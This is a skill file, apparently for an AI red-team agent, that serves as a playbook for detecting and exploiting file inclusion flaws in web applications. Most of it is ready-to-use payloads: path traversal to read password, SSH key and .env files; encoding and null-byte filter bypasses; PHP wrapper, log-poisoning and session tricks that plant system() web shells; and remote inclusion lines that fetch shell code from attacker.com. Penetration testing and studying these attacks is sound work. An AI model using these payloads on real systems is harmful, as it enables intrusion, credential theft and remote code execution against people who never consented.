---
name: file-inclusion
description: Detect and exploit local and remote file inclusion vulnerabilities for sensitive data access and code execution
origin: RedteamOpencode
---

# File Inclusion Testing

## When to Activate

- Parameter references file paths or filenames: `page=`, `file=`, `template=`, `include=`, `path=`, `doc=`, `lang=`
- Application loads content dynamically based on user input
- URL patterns like `/index.php?page=about` or `/view?template=report`
- Error messages reveal file system paths

## LFI Detection

### 1. Basic Path Traversal

```
# Relative path traversal
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?file=..%2f..%2f..%2fetc/passwd

# Absolute path
?page=/etc/passwd

# Windows targets
?page=..\..\..\..\windows\win.ini
?page=C:\windows\win.ini
?file=..%5c..%5c..%5cwindows%5cwin.ini
```

### 2. Determine Traversal Depth

```
# Start with many levels — works regardless of current directory depth
?page=../../../../../../../../../../../../etc/passwd

# If the app prepends a directory (e.g., /var/www/pages/)
# Count ../ needed to reach root: /var/www/pages/ = 3 levels
?page=../../../etc/passwd
```

### 3. Filter Bypass Techniques

```
# Double encoding
?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte (PHP < 5.3.4)
?page=../../../etc/passwd%00
?page=../../../etc/passwd\0

# Path truncation (PHP < 5.3, need 4096+ chars)
?page=../../../etc/passwd/./././././[...repeat...]

# Dot-dot-slash variations
?page=....//....//....//etc/passwd
?page=..;/..;/..;/etc/passwd       # Tomcat/Java
?page=..%c0%af..%c0%afetc/passwd   # Overlong UTF-8
?page=..%ef%bc%8f..%ef%bc%8fetc/passwd  # Unicode fullwidth slash

# Appended extension bypass (.php, .html added by server)
?page=../../../etc/passwd%00          # Null byte
?page=../../../etc/passwd%00.php      # Null byte + extension
?page=php://filter/convert.base64-encode/resource=index  # Extension auto-appended

# Wrapper when extension is appended
?page=php://filter/convert.base64-encode/resource=config  # reads config.php
```

## LFI — Sensitive Files to Read

### Linux

```
/etc/passwd
/etc/shadow                    # Usually not readable
/etc/hosts
/etc/hostname
/etc/issue
/proc/self/environ             # Environment variables — may contain secrets
/proc/self/cmdline
/proc/self/fd/0-20             # Open file descriptors
/proc/net/tcp                  # Network connections
/home/USER/.bash_history
/home/USER/.ssh/id_rsa
/home/USER/.ssh/authorized_keys
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

### Web Application Files

```
# Apache/Nginx config
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default

# Application source code
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php         # WordPress
/var/www/html/configuration.php     # Joomla

# Common config files
.env
config.php
config.yml
database.yml
settings.py
web.config                          # IIS
```

### Windows

```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\SAM      # Usually locked
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\Users\Administrator\.ssh\id_rsa
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
```

## PHP Wrappers (LFI to More)

### php://filter — Read Source Code

```
# Base64 encode file contents (bypasses PHP execution)
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/convert.base64-encode/resource=config
?page=php://filter/convert.base64-encode/resource=../config

# Read and decode
echo "BASE64_OUTPUT" | base64 -d

# Other filter chains
?page=php://filter/read=string.rot13/resource=index
?page=php://filter/convert.iconv.utf-8.utf-16/resource=index
```

### php://input — Code Execution

Requires `allow_url_include = On`.

```bash
# Send PHP code in POST body
curl -X POST "http://target/index.php?page=php://input" \
  --data "<?php system('id'); ?>"

curl -X POST "http://target/index.php?page=php://input" \
  --data "<?php system(\$_GET['cmd']); ?>"
```

### data:// — Code Execution

Requires `allow_url_include = On`.

```
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### expect:// — Direct Command Execution

Requires `expect` extension (rare).

```
?page=expect://id
?page=expect://ls+-la
```

### zip:// and phar:// — Via File Upload

```
# 1. Create malicious ZIP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php

# 2. Upload shell.zip (or shell.jpg with zip content)

# 3. Include via wrapper
?page=zip://uploads/shell.zip%23shell.php
?page=zip://uploads/shell.jpg%23shell.php

# phar:// (similar approach with .phar archive)
?page=phar://uploads/shell.phar/shell.php
```

## LFI to RCE

### Log Poisoning

```bash
# 1. Inject PHP into access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/

# 2. Include the log file
?page=../../../var/log/apache2/access.log&cmd=id
?page=../../../var/log/nginx/access.log&cmd=id

# Alternative: inject via SSH (if port 22 is open)
ssh "<?php system(\$_GET['cmd']); ?>"@target
# Then include:
?page=../../../var/log/auth.log&cmd=id

# Alternative: inject via SMTP, FTP, or proc/self/environ
```

### /proc/self/environ

```
# If readable, inject via User-Agent or other HTTP headers
# Headers appear in /proc/self/environ
curl -A "<?php system('id'); ?>" "http://target/?page=../../../proc/self/environ"
```

### Session File Inclusion

```
# 1. Set a session variable containing PHP code (via vulnerable input)
# Session files typically at:
/var/lib/php/sessions/sess_SESSION_ID
/tmp/sess_SESSION_ID

# 2. Include session file
?page=../../../var/lib/php/sessions/sess_YOUR_SESSION_ID

# If you can control any session value:
# Set username = <?php system($_GET['cmd']); ?>
# Then include the session file
```

### PHP Filter Chain (No File Write Needed)

```
# Generate arbitrary content via chained php://filter conversions
# Tool: php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# Outputs a long php://filter chain that generates the payload without any file

# Use the output as the inclusion parameter value
?page=php://filter/convert.iconv...../resource=php://temp
```

## Remote File Inclusion (RFI)

Requires `allow_url_include = On` (PHP) or equivalent in other languages.

```
# Basic RFI
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.php

# The remote file should contain raw PHP (not HTML with PHP tags executed remotely)
# shell.txt content: <?php system($_GET['cmd']); ?>

# Null byte to strip appended extension
?page=http://attacker.com/shell.txt%00

# Test if RFI is possible
?page=http://attacker.com/test.txt
# If "test" content appears in the page, RFI is confirmed

# SMB share (Windows targets, no allow_url_include needed)
?page=\\attacker.com\share\shell.php
```

## What to Record

- **Vulnerable parameter:** name, location, and how file path is constructed
- **Traversal depth:** number of `../` needed or absolute path capability
- **Files accessed:** list all successfully read files and their contents (especially credentials)
- **Filter bypasses:** null bytes, encoding, wrapper tricks that worked
- **Wrappers available:** which PHP wrappers are functional
- **RCE achieved:** method (log poisoning, wrappers, RFI), working payload
- **Impact:** sensitive data exposed, code execution level, lateral movement potential
- **Exact payloads:** copy-paste reproducible requests
